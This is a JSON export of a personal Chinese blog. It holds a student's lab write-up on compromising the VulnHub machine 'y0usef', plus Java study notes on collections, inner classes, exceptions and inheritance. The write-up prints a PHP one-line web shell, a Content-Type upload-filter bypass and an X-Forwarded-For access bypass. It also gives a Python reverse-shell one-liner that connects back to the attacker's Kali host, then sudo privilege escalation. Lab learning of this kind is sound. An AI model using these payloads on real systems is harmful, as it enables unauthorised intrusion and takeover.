{"meta":{"title":"铃的杂货铺","subtitle":"二阶铃图","description":"喜欢夏天的无名之辈","author":"可弟WZ铃号机","url":"http://blog.kekwy.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2022-07-30T02:45:25.000Z","updated":"2022-07-30T02:57:34.055Z","comments":true,"path":"404.html","permalink":"http://blog.kekwy.com/404.html","excerpt":"","text":"404"},{"title":"关于","date":"2022-07-31T13:41:20.153Z","updated":"2022-07-31T11:25:31.267Z","comments":false,"path":"about/index.html","permalink":"http://blog.kekwy.com/about/index.html","excerpt":"","text":"喜欢夏天的社畜程序猿，南京大学计算机系本科生，我的世界建筑玩家。 B站: 可弟WZ柒号机 知乎: 可弟岭冬 GitHub: Kekwy 近期计划： 文章：《从继承开始的Java应用笔记》 视频：《我的世界·水星生存指南》 项目：一个3D联机小游戏"},{"title":"文章合集","date":"2022-07-31T13:04:10.582Z","updated":"2022-07-31T13:04:10.582Z","comments":true,"path":"categories/index.html","permalink":"http://blog.kekwy.com/categories/index.html","excerpt":"","text":""},{"title":"留言板","date":"2022-07-31T13:03:54.437Z","updated":"2022-07-31T13:03:54.437Z","comments":true,"path":"comments/index.html","permalink":"http://blog.kekwy.com/comments/index.html","excerpt":"","text":"也可以是聊天室（"},{"title":"大伙儿","date":"2022-07-30T15:17:01.000Z","updated":"2022-07-31T13:04:48.714Z","comments":false,"path":"friends/index.html","permalink":"http://blog.kekwy.com/friends/index.html","excerpt":"","text":""},{"title":"记录生活","date":"2022-07-31T11:26:11.263Z","updated":"2022-07-31T11:26:11.263Z","comments":false,"path":"recordings/index.html","permalink":"http://blog.kekwy.com/recordings/index.html","excerpt":"","text":"2022七月7.31 网站功能初步竣工，将在使用过程中调整或完善。"}],"posts":[{"title":"渗透测试学习笔记lab1【y0usef】","slug":"渗透测试学习笔记","date":"2022-09-27T04:44:31.000Z","updated":"2022-09-27T07:00:00.851Z","comments":true,"path":"渗透测试学习笔记/","link":"","permalink":"http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"第一周 可弟WZ 主页：blog.kekwy.com 邮箱：&#x6b;&#x65;&#101;&#107;&#107;&#101;&#119;&#121;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109; 2022年9月27日 一、实验准备靶机：y0usef 下载链接：https://www.vulnhub.com/entry/y0usef-1,624/ 攻击机：kali 二、实验目标取得目标靶机的root权限和2个flag。 三、实验内容 在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。 在kali中执行以下指令进行局域网主机发现： 1$ sudo arp-scan -I eth0 -l 扫描结果如下： 可以推断1出靶机 地址为 10.0.2.5 。 1： 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。 在kali中执行以下指令扫描靶机的端口状态： 1$ sudo nmap -p- 10.0.2.5 扫描结果如下： 发现开通了22、80两个端口，提示我们可以考虑靶机上的ssh与http服务。为了进一步确定各端口的用途，我们可以通过以下指令2获取对应的服务版本信息： 1$ sudo nmap -p22,80 -sV -sC 10.0.2.5 2: -p 对指定端口扫描 ​ -sV -sC 默认安全脚本扫描 扫描结果如下： 我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码： 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的robots.txt文件3： 但令人遗憾的是，我们并不能查看该文件。 3: Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。 使用whatweb工具查看web应用所采用的软件构架： 1$ whatweb http://10.0.2.5 尝试使用工具dirsearch爆破 web 服务端的路径，发现一些隐藏的路径和文件： 1$ dirsearch -u http://10.0.2.5 结果如下： 得知4服务器上有三个我们可以访问的文件： 123/adminstration/index.php/index.php/login 其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。 4: HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。 上述结果中出现的状态码的含义分别为： 状态码 含义 403 (禁止)服务器拒绝请求。 301 (永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。 200 (成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 访问10.0.2.5/adminstration： 提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式： 启动Burp Suit并启用拦截，将浏览器代理设置为127.0.0.1:8080（Burp Suit的默认代理端口为8080）。 刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入X-Forwarded-For: 127.0.0.15（如下图），再将其发送。【后续被拦截的数据包都需要插入上述内容。】 发现成功进入一个登录界面： 这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。 5: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。 简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。 首先编写一个“一句话木马”的PHP 文件shell.php，内容如下： 1&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var?&gt; 尝试直接将其上传，发现网站提示文件被拒绝： 推测网站可能存在针对文件类型的过滤6，我们可以通过修改被拦截的报文中Content-Type字段的值进行绕过： 修改为：image/png： 文件上传成功了，并提供了上传完成的文件的URL。 6: 常见的过滤形式与绕过方法： 针对文件扩展名的绕过： 修改文件扩展名后，再上传。 2)针对文件类型的绕过： 修改报文中的Content-Type字段（如本次实验）。 3)针对文件内容的绕过： 在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。 通过URL访问文件： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php 进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls 指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python 得到了靶机上的python路径，说明靶机有python环境： 故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）： 1$ nc -nvlp 4444 修改对应的python代码： 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444. 将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell： 使用以下指令对反弹shell进行一个简单的升级: 1$ python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; 查看&#x2F;etc&#x2F;passwd 文件7： 1$ cat /etc/passwd 注意到有以下一项： 1yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash 说明有一个叫yousef的用户可以登录系统8，且主目录为/home/yousef。 进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。 7: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开： 1用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell 8: 对于用户的登录shell： /bin/false 是最严格的禁止login选项，一切服务都不能用， /bin/nologin 只是不允许系统login，可以使用其他ftp等服务 因此我们一眼就锁定了yousef用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。 第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。 退出反弹shell，在kali的shell使用以下指令： 1$ ssh yousef@10.0.2.5 成功登入yousef后，查看该用户所在的用户组： 1$ id 发现该用户属于sudo组，查看该用户可执行的指令： 1$ sudo -l 发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份： 1$ sudo -i 查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。 至此我们实现了root权限的提取，并成功获取了所有的两个flag。 【完结撒花】","categories":[{"name":"渗透测试学习笔记","slug":"渗透测试学习笔记","permalink":"http://blog.kekwy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"}],"author":"Ke_DiWZ"},{"title":"集合类与I/O操作","slug":"javaNotes-3","date":"2022-08-05T00:15:26.000Z","updated":"2022-08-06T15:39:01.691Z","comments":true,"path":"javaNotes-3/","link":"","permalink":"http://blog.kekwy.com/javaNotes-3/","excerpt":"","text":"数组的长度是固定的，集合的长度是可变的。 I. Collection接口 collection 接口时层次结构中的根接口，构成其的单位称为元素。 常用方法： 方法 功能描述 add(E e) 将指定的对象添加到该集合中 remove(Object o) 将指定的对象从该集合中移除 isEmpty() 返回boolean值，用于判断当前集合是否为空 iterator() 返回在此Collection的元素上进行迭代的迭代器，用于遍历集合中的对象 size() 返回int型值，获取该集合中元素的个数 通过迭代器遍历： 1234567import java.util.*;Collection&lt;String&gt; list = new ArrayList&lt;&gt;(); //将List实现类向上转型Iterator&lt;String&gt; it = list.iterator(); //创建迭代器while(it.hasNext()) &#123; //do something String str = (String) it.next();&#125; //遍历 tips：Iterator 的 next() 方法返回的是 Object 。 II. List集合 List集合包括List接口以及List接口的所有实现类； 允许元素重复，元素顺序就是对象的插入顺序； 包含Collection中的所有方法，此外还有如下两个重要方法： get(int index)：获得指定索引位置的元素； set(int index, Object obj)：将集合中指定索引位置的对象修改为指定的对象； 实现类：ArrayList（数组实现）、LinkedList（链表实现）。 III. Set集合 不按特定方式排序，不能包含重复元素，需要小心操作其中的可变对象； 实现类; HashSet：不保证迭代顺序永恒不变； TreeSet：额外实现了 java.util.SortedSet 接口，可以对集合中元素进行排序。 TreeSet 类增加的方法： 方法 功能描述 first() 返回此Set中当前第一个（最低）元素 last() 返回此Set中当前最后一个（最高）元素 comparator() 返回对此set中的元素进行排序的比较亲。如果此Set使用自然顺序，则返回null headSet(E toElement) 返回一个新的Set集合，新集合是 toElement（不包含）之前的所有对象 subSet(E fromElement, E toElement) 返回一个新的Set集合，是fromElement（包含）对象与toElement（不包含）对象之间的所有对象 tailSet(E fromElement) 返回一个新的Set集合，新集合包含对象 fromElement（包含）之后的所有对象 IV. Map集合 一个映射不能包含重复的key，每个key最多只有&#x3D;能映射到一个值。 常用方法： 方法 功能描述 put(K key, V value) 向集合中添加指定的可以呢与value的映射关系 containsKey(Object key) 如果此映射包含指定key的映射关系，则返回true containsValue(Object value) 如果此映射将一个或多个key映射到指定值，则返回true get(Object key) 如果存在指定的key对象，则返回该对象对应的值，否则返回null keySet() 返回该集合中的所有key对象形成的Set集合 values() 返回该集合中所有值对象形成的Collection集合 实现类： HashMap：基于哈希表实现，允许使用null值与null键，不保证顺序。（建议使用） TreeMap：可排序，不允许null键。 V. File类File构造方法 通过完整路径名（包含文件名）： 1File(String pathname); 通过父路径与子路径（包含文件名）： 1File(String parent, String child); 通过父路径对象与子路径（包含文件名）： 1File(File f, String pathname); 文件创建与删除123File file = new File(&quot;word.txt&quot;);file.delete(); //删除文件file.creatNewFile(); //创建文件 常用方法 方法 返回值 说明 getName() String 获取文件名称 canRead() boolean 判断文件是否为可读的 canWrite() boolean 判断文件是否可被写入 exits() boolean 判断文件是否存在 length() long 获取文件的长度（以字节为单位） getAbsolutePath() String 获取文件的绝对路径 getParent() String 获取文件的父路径 isFile() boolean 判断文件是否存在 isDirectory boolean 判断文件是否为一个目录 isHidden() boolean 判断文件是否为隐藏文件 lastModified() long 获取文件最后修改时间","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"类的高级特性与异常处理","slug":"javaNotes-2","date":"2022-08-01T11:50:13.000Z","updated":"2022-08-04T04:25:52.401Z","comments":true,"path":"javaNotes-2/","link":"","permalink":"http://blog.kekwy.com/javaNotes-2/","excerpt":"","text":"I. Java类包 类名冲突： 任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。 类的路径： 同一个类包中的类相互访问时，可以不指定包名； 同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。 指定包与导入包： 将 package 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。 1package 包名; 导入包： 123import 包名.*import 包名.类名import 包名.静态方法名 tips: 使用 import 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。 II. final 关键字 变量： 修饰常量变量； 对象引用被 final 修饰后无法使其指向另一个对象； Java中定义全局变量，通常使用 public static final 修饰，是能在定义时被赋值。 方法： 被 final 修饰的方法不能被重写； private 方法隐式被指定为 final 类型。 类： 被修饰的类不能被继承。 III. 内部类成员内部类 基础用法： 成员内部类的定义：（非内部类不能被声明为private或protected访问类型） 12345public class OuterClass &#123; // 外部类 private class InnerClass &#123; // 内部类 //... &#125;&#125; 内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）； 内部类中的变量与外部类变量同名时，可以使用 this 指针加以区分： 1234// 若内部类与外部类中均有变量xthis.x; // 内部类的xOuterClass.this.x; // 外部类的xx; // 同名局部变量、形参（若有） 在外部类和非静态方法之外实例化内部类对象，需要使用外部类： 12OuterClass out = = new OuterClass();OuterClass.innerClass in = out.new innerClass(); 内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。 内部类向上转型为接口; 将一个权限修饰符为 private 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程； 对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法； 12345678910111213141516171819202122interface OutInterface &#123; public void f();&#125;class OuterClass &#123; // 定义一个外部不可访问的内部类 private class InnerClass implements OutInterface &#123; // 实现接口方法 public void f() &#123; // do something... &#125; &#125; public OutInterface doit &#123; return new InnerClass(); // 将内部类向上转型为外部接口 &#125;&#125;...OuterClass out = new OuterClass();OutInterface outinter = out.doit();outinter.f();... 外部不可直接访问内部类中的 f() 方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口） 局部内部类 内部类可以在类的局部位置定义（如方法） 在方法中定义的内部类只能使用方法中被 final 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。 匿名内部类123return new A() &#123; ...//内部类体&#125;; 匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。 静态内部类 创建静态内部类的对象不需要其外部类的对象； 静态内部类的对象中不能访问非静态外部类的对象。 内部类的继承1234567891011public class OutputInnerClass extends ClassA.ClassB &#123; public OutputInnerClass(classA a) &#123; a.super(); // 生成B类的外部类对象 &#125;&#125;class ClassA &#123; class ClassB &#123; &#125;&#125; IV. 异常捕捉 try-catch 语句： 123456try &#123; // 可以发生异常的代码块&#125;catch(Exception e)&#123; // 异常处理&#125; finally 语句： 无论 try 中的语句是否发生异常，都会执行 finally 中的代码块。finally 不被执行的情况： finally 中发生异常； 之前的代码中使用 System.exit() 退出程序； 程序所在的线程死亡； 关闭CPU。 tips： Exception 是 try 代码传递给 catch 代码块的变量类型； 异常处理常用的函数： getMessage() ：输出错误性质； toString() ：给出异常的类型与性质； printStackTrace() ：指出异常的类型、性质、栈层次及出现在程序中的位置。 V. Java常见异常 异常类 说明 ClassCastException 类型转换异常 ClassNotFoundException 未找到相应类异常 ArithmeticException 算术异常 ArrayIndexOutOfBoundsException 数组下标越界异常 ArrayStoreException 数组中包含不兼容的值抛出的异常 SQLException 操作数据库异常 NullPointerException 空指针异常 NoSuchFieldException 字段未找到异常 NoSuchMethodException 方法未找到异常 NumberFormatException 字符串转换为数字抛出的异常 NegativeArraySizeException 数组元素个数为负数抛出的异常 StringIndexOutOfBoundsException 字符串索引超出范围抛出的异常 IOException 输入输出异常 IllegalAccessException 不允许访问某类异常 InstantiationException 当应用程序试图使用 Class 类中的 new Instance() 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常 EOFException 文件已结束异常 FileNotFoundException 文件未找到异常 VI. 自定义异常12345public class MyException extends Exception &#123; public MyException(String ErrorMessage) &#123; // ErrorMessage为要输出的错误信息 super(ErrorMessage); // 调用父类构造方法 &#125;&#125; VII. 抛出异常 throws：用于指定方法可能抛出的异常，用于将异常向上抛出。 12static void pop() throws 异常1, 异常2, ... &#123;&#125; throw： 程序在执行到 throw 语句时立即终止，其后语句都不执行； throw 抛出的异常必须使用 try-catch 语句快捕捉； 若想向上级抛出异常，必须在抛出异常的方法中使用 throws。 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"接口、继承与多态","slug":"javaNotes-1","date":"2022-07-30T07:00:16.000Z","updated":"2022-08-01T11:51:42.005Z","comments":true,"path":"javaNotes-1/","link":"","permalink":"http://blog.kekwy.com/javaNotes-1/","excerpt":"","text":"I. 类的继承权限修饰关键字： private 外部以及子类均不可访问 public 外部以及子类均不可访问 protected 外部不可，但子类可以访问 定义类时通过关键字extends + 父类类名定义继承； 子类方法中可以通过super关键字调用父类方法（受权限修饰关键字约束）； 子类中可以通过定义与父类某一方法名称相同的函数实现对父类中该方法的重写（覆盖）； 重写时如修改方法的权限范围，只能从小到大； 重写时返回值必须与父类中同名函数返回值相同或为其子类； 子类实例化时会自动调用父类的无参构造方法，但若需调用有参构造方法需要通过super关键字手动调用； 子类finalize()方法需要保证最后一个动作是调用父类的finalize()方法； 1234567891011121314151617181920212223242526272829303132333435class Test &#123; public Test() &#123; //do something &#125; public void doSomething1() &#123; //do something &#125; private void doSomething2() &#123; //do something &#125; protected void doSomething3() &#123; //do something &#125; public Test doTest() &#123; //do something &#125;&#125;class Test1 extends Test&#123; public Test() &#123; super(); //调用父类构造方法 super.doSomething1(); &#125; public void doSomething3() &#123; //do something &#125; /* private void doSomething3() &#123; //do something &#125; 写法错误 */ public Test1 doTest() &#123; //do something &#125;&#125; II. Object类 Objcect 类是所有Java类的父类。 tips：Object 类中的 getClass() 、notify() 、notifyAll() 、wait() 等方法不能在子类中重写。（被定义为final类型） Object 类中的重要方法： getClass()：返回对象执行时的Class实例。（Unity的getObejct） toString()：将一个对象返回为字符串，一般需要根据需要在子类中重写. tips：将对象打印时将自动调用该方法。 equals()：默认使用“&#x3D;&#x3D;”运算符根据对象的引用（地址）判断是否相等。故一般需要按需重写。 III. 对象类型的转换 向上转型：将子类对象视为父类对象。由具体到抽象，总是安全的。 1Quadrangle obj = new Patallelogram(); // 平行四边形是四边形的子类 向下转型：将父类对象转换为子类对象，必须通过强制类型转换，且必须保证当前父类对象是目标子类对象的实例。 12Quadrangle p = new Patallelogram();Patallelogram q = (Patallelogram)p; IV. 使用instanceof操作符判断对象类型可用于实现向下转换时对父类对象实例类型的判断。 语法格式：（返回值为布尔型） 12myobject instanceof ExampleClass;// myobject对象是否为ExampleClass类的实例 V. 方法的重载同过定义同名方法但参数不完全相同的方式实现方法的重载，但单单返回值不同不能实现重载。 编译器利用方法名、方法各参数类型和参数的个数以及参数的顺序来确定类中的方法是否唯一。 不定长参数也可以参与实现重载： 12int add(int a);int add(int... a); VI. 抽象类与接口 抽象类 tips： 抽象类不能实例化对象； 只有抽象类才可以承载抽象方法； 抽象方法在其子类中必须被重写。 定义抽象类的关键字 abstract 。 123public abstract class Test &#123; abstract void testAbstract();&#125; 接口： 定义接口使用关键字 interface ： 1234public interface 接口名 &#123; void doSomething(); // 自动虚方法，可以省略abstract关键字&#125; public：接口可以像类一样被权限修饰符修饰，但public关键字仅限于接口在与其同名的文件中被定义时； 接口中的方法必须被定义为public或abstract形式。 实现接口使用关键字 implements ： tips：Java中不许出现多继承但是可以通过同一个类实现许多接口来实现多继承，一个接口也可以继承另一个接口。 123456789101112#1class 类名 implements 接口1，接口2, ... &#123; &#125;#2interface intf1 &#123; &#125;interface intf2 extends intf1 &#123; &#125; 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"}],"categories":[{"name":"渗透测试学习笔记","slug":"渗透测试学习笔记","permalink":"http://blog.kekwy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}]}